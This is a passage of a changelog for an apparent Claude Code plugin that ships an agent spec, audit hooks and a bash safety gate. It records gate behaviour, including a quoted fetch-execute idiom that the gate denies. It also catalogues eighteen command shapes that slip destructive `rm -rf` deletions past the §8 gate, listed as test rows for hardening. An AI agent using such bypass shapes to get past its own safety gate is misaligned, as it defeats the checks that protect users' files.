...
**Core §2.1's routing table becomes a pointer.** Measured over 178 transcripts and 33,140 tool calls: 61 Skill invocations, 0.2%, with every mattpocock engineering skill at zero — and all three plugins were installed before the corpus begins, so a lack of opportunity does not account for it. Three routing layers were resident simultaneously, and Claude Code's own progressive disclosure already places each skill's `description` in the system prompt. The conclusion drawn is deliberately narrow, and it is the only one claimed: core's table is not what makes a skill get invoked.

The criteria move to §EXT §12, where the fallbacks they need already lived. That table is now task class → candidates, each carrying a fit criterion taken verbatim from the skill's own `description`, → what to do when every candidate is missing. No precedence among skills, so core's `sp` before `gs` clause is deleted rather than relocated. mattpocock gains rows for the first time; that plugin was installed after §12 was written.
...
**D1 could not be counted, and why is the finding.** `docs/spec-optimization-plan-2026-07-10.md` records its anchor as written to durable memory with an index line on 2026-07-10. The file is not on disk and not in the index, and the index's 18 entries match the 18 files present, so this is not a lost index entry — the anchor either never existed or was removed without a record. Its promotion condition has therefore never been measured rather than failed. Left unpromoted with the reason corrected, and the decision about whether to write the anchor or close the item is the operator's.

## [0.90.0] - 2026-09-21

Seven items of `docs/spec-optimization-roadmap-2026-09-21.md` — 0a, 0b, G0, G1a, G1b, G2 and G7 — plus the pre-ship repair rounds they earned. Not a contiguous range: §12.3 assigns G4 and G4-A to the next release, and G1c, G3, G5, G6 and the G4-B experiment are outside the work package altogether. (No commit count here, deliberately: the 0.89.0 entry opened with the wrong one, in a release about wrong claims, and a count written before the tag is cut is a number that keeps moving under its own sentence. `git log --oneline v0.89.0..v0.90.0` is the derivation.) The roadmap measured 178 transcripts and found that the rules governing whether a claim has evidence behind it are the rules nothing mechanical checks. Of the 26 HARD rules in `spec/hard-rules.json`, 16 are marked `self`, and they cover whether a claim has evidence, whether it stays consistent, and whether the agent reviewed its own work — Iron Law #2, the §10 honesty rules, §11 turn-yield. Four of the 16 already had a hook emitting rows for them, and that is the qualifier the sentence needs rather than a claim of zero coverage: three come from `transcript-structure-scan.sh`, which is advisory AND ships default-OFF, and the fourth is the post-compaction reminder. Nothing in that set could block, and the one detector that read prose for evidence was closed in 2026-07-24 for precision. This release moves the mechanically decidable part of it hook-side and instruments the two behaviours the measurement found dominant.

**Two new hooks, both opt-in and default OFF.** §EXT §13.3 requires a behaviour-layer hook to collect at least 30 days of false-positive signal before it is default-on advisory, and only then is a blocking form on the table. Neither of these denies anything today and neither is on unless you turn it on.

- `evidence-gate.sh` (Stop, `EVIDENCE_GATE=1`) fires when the last assistant message makes a completion claim, the session edited code files, and the transcript holds no non-error `Bash` result after the last code edit that is a test / typecheck / build run — judged by the command's own name, or by the shape of its output, because `tsc --noEmit` and `eslint .` print nothing at all when they are clean. It judges STRUCTURE, never prose. That distinction is the whole design: the 2026-07-24 labeling pass hand-labeled all 178 flagged instances across the detectors then collecting, and closed six of the eight, at a pooled precision upper bound of 0.17 over the labeled set. They did not all fail the same way — two of the six could not tell an executed command from a command string passed as data, or hardcoded this repo's plan-file naming — but the one that read PROSE for evidence, hunting for `Checked:`, for digits, for the word "passed", is among them. Prose has unbounded shapes. "Is there a command result after the last edit" does not.
- `rework-breaker.sh` (PostToolUse on `Edit|Write`, `REWORK_BREAKER=1`) counts edits per file per session and injects one line at each multiple of 8. The threshold was fixed before the data was collected: 58.7% of sessions with any edit reached 8 or more on their hottest file of any kind (46.8% counting code files only), the code-file histogram's modal bucket was 8-14, and one session reached 58 edits on a single file. §1 "Root cause over patch" already forbids that loop and is pure prose, so nothing observed it while it was running. The line carries the only fact the agent does not otherwise have — an agent mid-loop knows it edited the file again, not that this was the sixteenth time.

**`npm run smoke`.** Two integration suites — a fresh install through to a working session, and install → upgrade → uninstall. The measurement found `smoke|e2e|end-to-end|integration` matches the core spec once, in §8.V3, where it means "sandbox a destructive path first" rather than "verify it works"; §7's L2 row asks for lint + typecheck + test with numbers and says nothing about whether the tested path is one a user can reach. An evidence requirement with no coverage requirement selects for behaviour that fits the suite. The entry point reports how many suites it RAN and fails short of its own list, because "0 failed over 0 suites" and "0 failed over 2" otherwise print the same line.

**The long-task ledger survives compaction.** `tasks/<slug>-ledger.md` has five sections; `session-start-check.sh` re-injects two of them on `SessionStart` with `source` `compact` or `resume`. Not the work — that is in the repo — but the Decisions, which are filled once at task start and are what a later turn cannot re-derive, and Next. Bounded to the newest ledger, a 14-day window and 1600 characters — the cap is applied inside jq, which slices by codepoint, so it cannot leave a truncated multibyte tail that would fail the whole envelope. It lands in context at the moment context is scarce. Format and rationale: `docs/ARCHITECTURE.md`, "Long-task ledger (G7)".

**`scripts/sampling-audit.js` gains `behaviorMetrics`.** Rework rate, test-weakening rate and skill-invocation rate, stratified self vs external. These are exact counts of tool calls rather than heuristics, so they carry no precision label and are never `collecting` — what they carry instead is a validity statement that travels with the numbers in both the report and `--json`, because each measures a proxy: edit shape is not defect rate, a falling assertion count is a per-hunk upper bound on weakening, and a model that inlines the equivalent of a skill is indistinguishable here from one that skipped it.

**`scripts/doc-check.mjs`.** A mechanical self-check for a long-form analysis document: every backtick-quoted repo path resolves, every §-anchor exists in the spec sources, every `G<n>` reference has a heading, every stated ratio recomputes, and claims the document has retracted stay retracted. The four structural checks derive their subject from the text; the two judgement calls come from a fenced `doc-check` block the document carries itself. It found two live defects on its first runs, both of the class this repo keeps re-finding: a section number from another document written with the §-sign that means a spec anchor everywhere else in the file, and an `ARCHITECTURE.md` suite count of 79 against 80 on disk. (Corrected after the tag, 2026-09-22: this paragraph also credited a third finding — that a measurement's stated matcher was not the one that produced its numbers — and that finding was itself wrong. The stated matcher WAS the one used; `--until=1790021507` reproduces 1618 as 804/763/37/14, every sub-count exact. Recorded rather than deleted, on the same rule the 0.89.0 entry follows.)

**Two documents asserted limits they had never tested, and a probe settled both.** `docs/HOOK-PROTOCOL.md` said the `additionalContext` envelope belongs to `PreToolUse`, `UserPromptSubmit` and `SessionStart` — a closed set of three. A scratch project registering a `PostToolUse` hook that emits a unique token got the token quoted back by the model on Claude Code 2.1.278, so the list is four events long and now says which entries are measured and which are schema facts. The same probe method answered the roadmap's open question about `PreCompact` and `TaskCompleted`: `PreCompact`, `SubagentStart` and `SubagentStop` all fire; `TaskCompleted` did not fire once across 31 hook invocations spanning tool pre/post on the main line and inside a subagent, Stop on both, subagent start and stop, session start and end, and `PreCompact` itself. Its name appears in the binary 26 times, which is what it was compiled with and not what it delivers.

**`lint-argv`'s scan scope gains `.mjs`.** The extension is a packaging detail, not a contract boundary, and three gates read their scope from that one list — an `.mjs` CLI under `scripts/` would otherwise owe no argv contract and no documented exit codes.

Kill-switches: `DISABLE_EVIDENCE_GATE_HOOK`, `DISABLE_REWORK_BREAKER_HOOK`, and the sub-feature `DISABLE_LEDGER_INJECT` for the ledger injection, which fires on `resume` as well as on compaction.
...
**`doctor`'s `hook-drift` row gave a false cause, and advice that could not clear it, in three reachable states.** Each ended in a counted red and an exit 3 on a healthy machine — the standing-failure shape 0.84.0 demoted the row to avoid, arriving through three other doors.

- The cause named the marketplace clone, which is on *neither* side of the comparison: `compareHooks` is handed this tree and the root that fired hooks. And `/claudemd-refresh` cannot clear a stale record — only the next SessionStart rewrites it. Both halves now describe what was actually compared, and both exits are offered.
- `compareHooks` tested for a `hooks/` directory on its **first** argument only. A recorded root that had lost its `hooks/` therefore reported all 19 scripts `missing-in-market`. `doctor` had guarded its upstream call site against exactly this since that axis was written; the running axis — the one that counts toward the exit code — had no guard. The guard now lives inside `compareHooks`, asked after the source check so the `claudemd-cli` npm package keeps a reason naming its own side.
- With no record at all, `runningPluginRoot()` fell through to `activePluginRoot()`, whose last arm is the marketplace clone — upstream, the tree a reinstall copies *from*, never what Claude Code executes. The counted row performed the comparison the advisory `hook-drift:upstream` row owns, while that row printed `skipped (self-compare)`. The two axes had swapped jobs.

**Behaviour note**: in those three states `claudemd-doctor` now exits 0 where it exited 3. Nothing else about the row moves; real drift still counts and still exits 3. Anyone scripting on the exit code was reading a false red.

**The pure-bash timeout turned its own ceiling into a floor.** `platform_timeout`'s watchdog subshell inherited fd 1, and a command substitution returns only when every write end of its pipe closes — so once the wrapped command finished, the orphan `sleep` held the pipe open for the full ceiling. Filed as intermittent; it is not, where it matters. Intermittency exists only when the wrapped command is a bash builtin, and all three call sites the bug can reach — the command substitutions, out of five call sites in all — wrap an external binary: `git ls-remote` at ceiling 3, and two `gh run list` calls at ceiling 2. The other two redirect into a log file, so no pipe is waiting on the watchdog and they were never affected. Measured 30/30 blocked with a *minimum* of 2008ms against a 2s ceiling, and 0/30 at 8–20ms with the redirect. The branch is unreachable wherever coreutils supplies `timeout`, so the exposure is native macOS without it — which this repo has a CI leg for — plus anyone setting `CLAUDEMD_NO_TIMEOUT_BIN=1`. The test suite had been paying for it too.

**Writing *about* a fetch-execute shape trips the gate that guards it.** Pattern 3b anchors command position on a set that includes a backtick, and it matches the raw command rather than the sanitized view, so a shell idiom quoted in prose reads as an invocation: a commit message mentioning `` `eval "$(curl …)"` `` is denied, and the same sentence without the backticks is allowed. The pattern is not narrowed here — the anchor class is shared by four patterns, and the obvious edit silently disabled the whole fetch-execute gate during evaluation, caught only by known-deny control rows. What changes is the deny message, which now names the route the ship runbook already takes for tag messages: keep the text off the command line, write it to a file and pass the path. No verdict moves: the edit is confined to the text of the deny reason, the corpus holds at 940/940, and a replay of the 3,258 recorded real commands carrying a §8-relevant token — the only ones whose output this could reach — holds at 662 denies on each side with zero flips in either direction.

**`tests/tools/replay-gate.sh`** is new, and until now the repo's own rule for gate changes had nothing to execute. It drives real recorded commands through two revisions of a gate and counts flips each way. Not wired into any runner — it reads the operator's transcript history, so it has no fixed expected output.

Two things are written into it that cost something to learn. Its header says what a replay cannot do: it proves you did not start denying work that used to pass, and says nothing about whether you started allowing something dangerous — the direction a *narrowing* change actually needs. And it refuses to run unless the gate denies three known-deny rows on **both** sides, because its own first run did not. Pointed at a bare copy of the hook, all 15,551 recorded commands came back `allow` on both sides: zero flips, zero denies, a clean-looking bill of health that meant nothing. The hook resolves `lib/` from `BASH_SOURCE`, the copy had none beside it, `source … || exit 0` fired, and an exit-0 with empty stdout is exactly what the harness scored as "allow". A gate that cannot load its library fails open, and a harness with no rows it knows the answer to will certify anything.

**Smaller repairs of the same kind.** The session-exit checkpoint told maintainers they had run zero validations when the reducer had in fact seen one and reset the counter at the next mutation. `/claudemd-install` told users an already-installed spec is overwritten with no backup, which stopped being true in 0.83.0 when it began copying to `spec-backup-<ISO>/`; the doc is now bound to the observed namespace by the install test itself. The rule-hits schema doc described the `project` field encoding as per-byte in the same sentence that described it as per-character, and a worked example in the doc is now driven through both encoders. `CONTRIBUTING`'s exit-code table named no exception where one exists. Four comments and a schema line still said a sentinel is consumed by rename when the code has used `rm -f` for some time.
...
A patch for four defects a review round found in 0.84.0 **after it was tagged**. The tag was cut with a review I had myself commissioned still outstanding — the process failure is recorded here rather than quietly fixed, because it is the same shape as the defects it let through: acting on a check that had not actually returned.

**The one that could reach you.** `doctor`'s `statusline` row compared your renderer against the **registered** plugin root while both repair commands — `/claudemd-install` and `/claudemd-statusline` — copy from `${CLAUDE_PLUGIN_ROOT}`, the **running** root. Those differ in the pending-restart window after any upgrade, so the row asked for a file no reachable command could produce. Measured end to end: doctor exit 3, run the advised command, it reports success, doctor still exit 3 with the same row. **Latent in 0.84.0** — that release did not change `scripts/statusline.sh`, so the two renderers were identical and nobody saw it; the first release that touched the renderer would have shipped it live. The row now compares against the root the repair copies from, and a test builds the two-version mid-upgrade state and fails on 0.84.0's behaviour.

The advice goes back to `/claudemd-install`, which is now the true answer: `commands/claudemd-statusline.md` says "Report and STOP" when claudemd is already a registered guest, so it declines the refresh by default, while `install.js` refreshes an already-ours renderer in both wired shapes without touching the slot — that fix landed in 0.84.0.

**The one worth reading if you write tests.** 0.84.0's assertion that "the advice names a command that actually recopies the renderer" was **vacuous**. The detail string embeds the renderer's own path, `…/claudemd-statusline.sh`, so the regex `/\/claudemd-statusline/` matched the filename and returned true for the *old* advice too. A test that agrees with a claim instead of checking it, shipped inside the release that exists to delete exactly that. The assertion now matches only after the `Fix:` clause, and a control feeds it advice it must reject — so the helper is itself tested rather than trusted.

**And the numbers were wrong.** 0.84.0's Tests paragraph said `doctor 60 → 75`, `paths 22 → 32`, `session-start 45 → 50`. The real counts at that tag were **81**, **39** and **52** — the prose was updated across three review rounds and the figures were not. Corrected here and in the 0.84.0 release body.

**Migration**: `/claudemd-refresh`, then restart Claude Code. No spec change, no new deny, nothing to opt out of. **Way back**: pin the marketplace entry to `v0.84.0`; `docs/ROLLBACK.md` carries the procedure.

**The pre-tag review then found the same defect one layer down.** The control written to prove `assertAdvises()` is not vacuous was itself vacuous: deleting the `Fix:` slice — restoring 0.84.0's behaviour exactly — left both its assertions green, because the sample advice contained no `/claudemd-install` anywhere and so the `throws` fired either way. What separates the two implementations is a detail whose *path* carries the command while the `Fix:` clause does not, and that case was missing. It is there now, and the control was verified by running it against the mutant: red on the mutant, green on the shipped helper. A control that passes on the thing it exists to catch is the same defect as the assertion it replaced.

**Two findings left for their own change**, both Low and neither user-facing today: `install.js` prints a `[claudemd] statusLine …` line for `set` / `host-detected` / `skipped-foreign` but stays silent on `refreshed` / `guest-refreshed`, so the advised repair now succeeds with no output — repair without report, the mirror of the defect this release fixes, and a new user-visible line is not something to add in a patch on the strength of one review. And a doctor hand-run from a clone that is not the running plugin goes red with no explanatory row, which `/claudemd-doctor` cannot reach.

**Tests.** `doctor.test.js` 81 → 82. The added case is the mid-upgrade statusline state, verified RED against 0.84.0's comparison baseline and green against this one. `npm run check` exit 0, read from `$?` — it went red twice on the way here, once on an unused variable and once because this entry did not yet contain the literal `` `$` `` token that `changelog-structure.test.js` splices its mutation control at, and both times the notification for the background run reported success because it was reporting the wrapper's trailing `echo` rather than the command.

## [0.84.0] - 2026-09-08

A QA release. A full-lifecycle pass on a throwaway `HOME` — install → use → update → break → repair → uninstall → reinstall — found **five defects, four of them in the checks that exist to find defects.** The install path itself came through clean.

**Read this first if you have ever run `/claudemd-doctor` and believed it.** The headline finding is that `hook-drift`, the check whose whole job is "are the hooks Claude Code runs the ones this version ships", was comparing the wrong directory — and had been since v0.9.22. It read `~/.claude/plugins/marketplaces/claudemd`, the marketplace **clone**. Claude Code does not run hooks from there. Per the plugins reference, `${CLAUDE_PLUGIN_ROOT}` is "the plugin's installation directory", and marketplace plugins are **copied** into `~/.claude/plugins/cache/<marketplace>/<plugin>/<version>/` rather than used in place. The clone is upstream of that copy.

That inverts the check in exactly the state it was built for. `/plugin marketplace update` advances the clone on its own — verified on a sandbox marketplace: a change committed with no version bump reaches the clone, and `claude plugin update` then reports "already at the latest version". So source and clone agree, the row prints `marketplace hooks match source`, and the stale hooks the check exists to catch go on running. Reproduced directly: a cache whose `pre-bash-safety-check.sh` differed from source by a `$`-carrying comment line, behind a byte-identical clone, and doctor exited **0** with a green `hook-drift`.

The reverse miss is just as real and hits more people. `claude plugin marketplace add <path>` — a local directory, a git path — records `source: directory` and creates **no clone at all**. For those installs both `hook-drift` and `spec-cache-drift` skipped permanently, reporting `skipped (market-root-missing)` forever. They now resolve the running root from `installed_plugins.json`, fall back to the newest versioned cache directory, and only then to the clone, so both users get a real comparison.

**What changes for you.**

- **`hook-drift` compares the plugin root Claude Code actually runs**, and names which basis resolved it (`installed-plugins`, `plugin-cache`, `marketplace-clone`). A machine carrying stale hook code behind a fresh clone will go from green to red on the next `/claudemd-doctor` — that is the fix reporting a condition that was always there, not a new failure. `/claudemd-refresh` clears it.
- **A new `hook-drift:upstream` row, because the row above is the maintainer's axis and not yours.** `/claudemd-doctor` runs `node ${CLAUDE_PLUGIN_ROOT}/scripts/doctor.js`, so on an ordinary install doctor's own tree *is* the running plugin and comparing the two answers nothing. The question a user has is "does what I run still match the marketplace", and the new row asks exactly that. It resolves the marketplace through `known_marketplaces.json` rather than the hardcoded clone path, so it also covers a marketplace added from a local directory — those create no clone, which is why both drift rows used to report `skipped (market-root-missing)` forever for them. `spec-cache-drift` moved to the same upstream basis, its own stated subject. Caught while reviewing this release's first draft, which had fixed the maintainer's axis by deleting the user's.
- **`plugin cache:staleness` stops comparing against a version you have not installed.** It read the clone too, so it announced "stale registration" for an upgrade that had not happened.
- **doctor's repair advice names a command that repairs.** Three rows told users to run `/plugin install claudemd@claudemd`. On an already-installed plugin that prints "already installed" and copies nothing, because Claude Code does not fire `postInstall` — measured: with `~/.claude/CLAUDE.md` deleted, the advised command left it deleted, and `install.js` restored it. The rows now say `/claudemd-install`.
- **A new `statusline` row.** `settings.json` names a renderer path and Claude Code shells out to it on every render, so a deleted `~/.claude/claudemd-statusline.sh` prints "No such file or directory" where your status line belongs — permanently, and doctor reported exit 0 through all of it. The row also flags a renderer left over from an older version. It is silent when the slot is not claudemd-owned, and it is **not** advisory: it moves the exit code.
- **An unparseable manifest now repairs itself.** `.claudemd-manifest.json` present but truncated read as an installed state: the version probe pulled `.version`, got empty, and the guard written for pre-0.1.9 manifests exited 0. Every session after a bad write did nothing, while doctor called the file "missing" and sent you to `/plugin install`. SessionStart now re-enters the bootstrap, which rewrites the manifest atomically. Gated on `jq` being present — without it, "corrupt" and "legacy, no `.version`" are indistinguishable and the old skip is the safer read.
- **A deleted spec file now says so.** An *edited* `~/.claude/CLAUDE.md` bannered; a *deleted* one was silent, on a rule reading "absent is not drift". Absence is worse than drift — Claude Code reads that file as your user-global instructions, so losing it unloads the spec — and it gets its own banner naming `/claudemd-install`, because the drift fix (`/claudemd-update`) cannot diff a file that is not there.

**Migration**: `/claudemd-refresh`, then restart Claude Code. No spec change ships here, so `/claudemd-update` has nothing to apply. **Way back**: pin the marketplace entry to `v0.83.0` and follow `docs/ROLLBACK.md`; there is no new deny in this release to escape from, and the one new red row is a report, not a block.

**Not fixed, recorded instead.** `claude plugin uninstall` leaves the versioned cache directory on disk rather than removing it immediately, so the README's "CC removes plugin cache itself" is true only of its eventual in-use sweep. And `settings.json.claudemd-backup-<ISO>` survives `CLAUDEMD_PURGE=1` — that is a copy of *your* file, so purge is right to keep it; the uninstall section now says so instead of leaving it as an undocumented leftover.

**The one worth picking up next.** `hook-drift` is advisory because nothing available to a doctor process separates a maintainer's checkout from an in-place plugin load — but that is a statement about what Claude Code hands us, not about what is knowable. The review found the way through, and it is worth writing down so the next attempt does not start by rediscovering `CLAUDE_PLUGIN_ROOT`: **hooks are the one claudemd component CC fires from the root it actually loaded** — `hooks.json` commands get the token expanded by CC, and every hook already resolves its own root from `BASH_SOURCE`. Persisting that root unconditionally from SessionStart into `~/.claude/.claudemd-state/`, which already holds per-session sentinels, makes "the root that fired hooks this session" ground truth, covers all three in-place shapes, needs no environment variable, and measures the bit by the same mechanism the row is about instead of inferring it. A partial version already exists — `.claudemd-manifest.json.pluginRoot` records the root that last ran `install.js`, which SessionStart invokes from the loaded root — and is incomplete only because `install.js` re-runs on a version mismatch, so it goes stale when someone moves between a cache install and a dev tree at the same version. Process ancestry was considered and rejected: it is `/proc`-shaped, sees only `--plugin-dir`, and the probe written to test it produced a false positive by matching its own command line.

Three more from the review, each deliberately left for its own change rather than settled between a review round and a tag:

- **The corrupt-manifest re-entry has no back-off.** Against a plugin root that is itself broken, three consecutive sessions each ran `install.js` twice and the manifest stayed corrupt. This is not a new loop class — a fresh install against a broken plugin root already behaved this way — but it is a new entrance to it, and adding back-off is a design decision, not a repair.
- **A manifest that parses but carries no `.version` is still invisible.** `jq -e .` is truthy for `{}`, so that shape still exits 0 silently and doctor still reports it green. The release closes "unparseable"; "parses but is empty" remains. Tightening it collides with the pre-0.1.9 legacy manifest the original guard was written to tolerate, which is why it is not done here.
- **A dangling-symlink spec reports as MISSING**, because the check uses a bare `-f`. That is defensible on its own, but `emit_user_content_banner` in the same file distinguishes `! -e` from `! -L` for exactly the stow/chezmoi shape, and the advised `/claudemd-install` writes *through* the link into the user's dotfiles tree — deliberately, per `writeJsonAtomic` and `createBackup`. Those two halves are one policy and should be decided together.

**The pre-ship review found four more, and one of them was this release's own defect repeated.** The `statusline` row shipped advice — `/claudemd-install` — that is a no-op for exactly the users most likely to need it. `install.js` calls `adopt({emptyOnly: true})`, and for a slot owned by a composite host (code-graph) that call returned *before* `copyRenderer`, so a guest-registered user's renderer was never refreshed on upgrade. The first release touching `scripts/statusline.sh` would therefore have turned the new non-advisory row permanently red for them, advising a command that does nothing about it. Writing repair advice that does not repair is the defect this release exists to remove, and it very nearly shipped one of its own. `adopt` now refreshes a renderer that is already ours without claiming the slot, and the row names `/claudemd-statusline`.

Three more from the same review:

- **Both drift rows are advisory; `statusline` and `plugin-root:stale-registration` are not.** `hook-drift:upstream` because the marketplace clone tracks `main`, not the released tag — of the last 60 commits 19 touch `hooks/*.sh` with 18 carrying no version bump, so for anyone who has run `/plugin marketplace update` on its own the running hooks legitimately differ from the marketplace, and counting that would leave `/claudemd-doctor` exiting 3 for most of the window between releases. `hook-drift` for a blunter reason, and it took three review rounds to arrive at: **the row cannot tell which caller is asking.** For a maintainer with a checkout and an install, "does this checkout differ from the installed plugin" is signal. For an in-place install — `--plugin-dir`, a skills-directory plugin, a synced plugin, all documented as used in place rather than copied — the checkout *is* the running plugin, and the row compares it against an unrelated leftover cache dir. `CLAUDE_PLUGIN_ROOT` looks like the discriminator and is not: Claude Code expands that token **into the command string** and exports nothing, so a doctor process never sees it (`env | grep -c CLAUDE_PLUGIN` → 0 in a live session; transcripts record the command with the token already substituted). A version of this release gated the row on that variable, was inert in production, and would have fired only for someone who had exported it by hand — the maintainer run it would then have wrongly silenced. Since no signal separates the two callers, the row prints and does not count. Before this release it skipped for in-place users; counting it would have handed them a permanent exit 3 with wrong advice.

  What advisory costs, measured rather than assumed: enforcement drift stays counted, because the 15 hook self-tests catch it behaviourally — on a tree with `hooks/lib/hook-common.sh` deleted, 13 of 15 fail; with it present but gutted, the 4 that fail are exactly the ones asserting a **deny**, which a gutted lib cannot produce. Observability drift is what becomes report-only: a `hooks/lib/*.sh` change that leaves enforcement intact but breaks telemetry — the v0.9.15 `rule-hits.sh` shape — passes all 15 and no longer moves the exit code.
- **Stale registration is no longer reported as hook drift.** Claude Code pins a session's hook paths at startup, so after an update doctor runs from the old cache dir while the registry names the new one. Both are real installs and the gap is a pending restart. Reported as drift it said the opposite of the truth — it called the running root "source", called the idle one "the running plugin root", and blamed a marketplace clone that had nothing to do with it. Measured on the maintainer's own machine, which was in this state during the review: `compareHooks(0.81.0, 0.83.0)` → `driftCount 1`. It now has its own row, `plugin-root:stale-registration`, whose fix is `/reload-plugins`.
- **The missing-spec banner stopped asserting something false about three of the four files it watches.** Only `~/.claude/CLAUDE.md` is injected every session; `CLAUDE-extended.md` is read on demand per §2.2, and `OPERATOR.md` and `CLAUDE-changelog.md` are not read by Claude Code at all. The strong sentence is now attached to `CLAUDE.md`'s absence rather than to the list. It also now names `SPEC_DRIFT_IGNORE`, the per-file escape it already honoured but did not advertise — the drift banner one branch away names both, and its comment says why: `OPERATOR.md` is a human runbook someone may legitimately not want, and offering only the all-or-nothing switch to a user who has already deleted a file is how a gate teaches people to silence it.
- **`hook-drift` stops comparing an in-place plugin against a leftover cache dir.** The plugins reference documents three shapes that are not copied into the cache and run where they are — `--plugin-dir`, a skills-directory plugin, a synced plugin. `activePluginRoot()` only resolves cache paths, so for those it returned an unrelated old cache dir and the row compared the real running root against something that is not running: the same mislabelling as the stale-registration case, one layer out. `CLAUDE_PLUGIN_ROOT` separates the two callers — Claude Code sets it when it invokes the plugin, and it is unset when a maintainer runs `node scripts/doctor.js` from a checkout — so the row now skips when doctor *is* the running plugin.
- **Two defects in the new resolvers themselves.** `upstreamPluginRoot` took the first `claudemd@*` key while `activePluginRoot` takes the newest version, so with claudemd installed from two marketplaces the two disagreed and `hook-drift:upstream` compared one marketplace's cache against another's clone; it now follows the install that is actually active. And the version comparator mixed `semverCmp` with `localeCompare`, which is not a total order — `Array.sort` may return an arbitrary permutation on such a comparator rather than merely an imperfect one.
- **`upstreamPluginRoot` had no unit tests at all** while two doctor rows depended on it, with the object-`source` and non-`./`-`source` branches reachable from nothing. Seven cases now cover it.
- **The stale-registration row died on a symlinked `~/.claude`.** Its cache-membership gate compared a lexical path on one side against a realpath'd one on the other — `installPath` is the string Claude Code recorded, while the running root comes from `import.meta.url`, which Node has already resolved. Under stow, chezmoi, or any relocated config dir the two disagreed, the row never fired, and `hook-drift` printed the exact mislabelling the row exists to delete. Both sides realpath now; verified on a sandbox whose `~/.claude` is a symlink, where the row went from absent to firing.

**Tests.** 30 cases added across three suites before the review, plus 15 during and after it, each one first reproduced against the pre-fix tree, all counts read from the runners on both sides: `paths.test.js` **22 → 39** (`activePluginRoot` resolution order, marketplace-name independence, the newest-of-several rule, a recorded path that no longer exists, a recorded path pointing outside this `HOME`, and the numeric-vs-lexicographic sort that `0.10.0` breaks); `doctor.test.js` **60 → 81** (a stale cache behind a matching clone, a path-source marketplace with no clone, the four `hook-drift:upstream` states, corrupt-vs-missing manifest wording, four statusline states, and the advisory-set membership); `session-start.test.sh` **45 → 52** (unparseable-manifest repair, its `jq`-absent gate, the deleted-spec banner with a healthy-install control and a still-reports-as-drift control). Two pre-existing tests changed verdict because they pinned the defects: `hook-drift check skips when no marketplace install exists` asserted the permanent skip, and session-start Case 29 asserted that a deleted spec stays silent.

Two of this release's own defects were found by its own gates rather than by review, which is the argument for writing the tests before believing the fix. `readPluginVersion('')` joins its argument with `package.json`, so an empty root reads the *current working directory's* version — for a doctor run inside this repo, this repo's; the suite failed on it within a minute and it now has its own case. And `hook-drift:upstream` needed the `hooks/` existence guard that `spec-cache-drift` has always had, because `compareHooks` tests for that directory on its first argument only and an upstream lacking one would report all 15 scripts missing and paint a healthy install solid red.

`npm run check` exit 0, read from the exit code rather than from grepping its output — `npm run lint` is a five-step `&&` chain ending in `prettier --check`, which reports style issues as `[warn]` and so is invisible to a grep written for `error`; that step did go red once during this work and the exit code is what said so. `version-cascade-check` ok across 3 spec sites and 6 semver sites.

## [0.83.0] - 2026-09-08

A spec release with one installer fix, and **no hook changes a single verdict**.

**Read this first if you keep your own notes in `~/.claude/CLAUDE.md`.** Until this release, upgrading destroyed them. `install.js` decides whether that file is "claudemd's own" with `looksLikeSpec` — an `# AI-CODING-SPEC` line anywhere in the first **256 bytes** — so the spec *with your notes appended below it*, which is the natural way to keep notes in a file that already is the spec, counted as claudemd's own and was overwritten with no copy and no warning. Measured across four sandbox homes on the pre-fix installer: appended notes and notes prepended above the spec both reported `userContentDetected: false`, produced no backup directory, and lost the text; only a file with no `# AI-CODING-SPEC` line at all was preserved, and a user in that state is not running the spec. The overwrite happens on the SessionStart after `/claudemd-refresh`, before anyone could read this paragraph, which is why the fix ships here rather than being documented as a caveat. **Install this release before your notes go through another upgrade** — 0.83.0's installer is the one that runs during the 0.82.0 → 0.83.0 sync, so it protects that hop too.

Now: the file about to be replaced is **copied** into `~/.claude/spec-backup-<ISO>/` whenever it is not byte-identical to the incoming spec. Copied, not moved — a moved file breaks the write-through that a stow/chezmoi symlinked spec depends on, and would leave nothing at `~/.claude/CLAUDE.md` if the write that follows failed. The copy lands in the `spec-backup-` namespace — update.js's, which install.js now shares — never the personal one that `uninstall`'s restore reads, so the v0.23.11 property that put it there — restore returns the user's own file, and pruning cannot bury it — is untouched. A byte-identical re-install still copies nothing — reached by a forced re-install rather than by ordinary sessions, since SessionStart exits before the installer when the versions already agree. §8 now names the spelling that gets you past its own gate, and the twenty places that gate is currently wrong are written down instead of left to be rediscovered. Spec goes to **v6.29.1** — the first core version that is net-negative, at **−2 bytes**.
...
- **Eighteen §8 false negatives are recorded** as corpus rows `S8-PROV1`..`S8-PROV20` (two of those twenty rows are not false negatives and are labelled as such — see below) with two controls. Each of the eighteen allows today and deletes outside the temp dir at runtime — mostly as `rm -rf /build`, the empty-variable collapse the provenance branch cites in its own comments. A subshell or backgrounded assignment; prose inside a quoted word; `sh -c` inner text that unwrap promotes to command position; an assignment that runs after the rm; six block bodies the shell may never enter; three function-body forms; `unset ${x-S}`. They are `pass` rows because that is the shipped verdict — the label records behaviour, it does not endorse it.

  Two of the twenty rows earn their place by being something else, and the pre-tag review is why they say so rather than being counted in. `S8-PROV17` — a function that is *called* — is a **control**: a bash function body is not a subshell, so the assignment binds the parent and the allow is correct. It is the shape the abandoned scanner got backwards, denying it. `S8-PROV20`, the opaque `DEBUG` trap, is a real hole but its damage needs the environment to supply the trap body; expanded with `$CODE` unset it stays inside the temp dir. Counting a correct allow as a hole would give the next reader a reason to distrust the eighteen that are plain.
...
**Migration**: `/claudemd-refresh`, then restart Claude Code. That is the whole procedure, and it is worth being precise about what it does, because this release changes a file you own — `~/.claude/CLAUDE.md` §8. **The spec is overwritten automatically and without a prompt.** SessionStart sees the version mismatch and runs `install.js`, which treats a spec-shaped `~/.claude/CLAUDE.md` as claudemd's own file and copies the new one straight over it. Running `/claudemd-update` afterwards shows a zero diff — by then there is nothing left to accept. The overwritten file is now **copied to `~/.claude/spec-backup-<ISO>/` first** — see the installer fix below, which is the one behaviour change in this release that is not a line of prose.

**Way back**: your previous `~/.claude/CLAUDE.md` is in the newest `~/.claude/spec-backup-<ISO>/` — copy it back. To return the whole plugin, pin the marketplace entry to `v0.82.0` and run `CLAUDEMD_ALLOW_DOWNGRADE=1 node scripts/install.js` from a `v0.82.0` checkout — `install.js` refuses a downgrade without that variable, and it is the only thing that repoints both the plugin manifest and the installed spec. `docs/ROLLBACK.md` § "Local machine needs the previous version back" carries that procedure. Declining `/claudemd-update` is **not** a way back, and an earlier draft of this entry said it was. Since no hook changed, there is no new deny to escape from in this release.

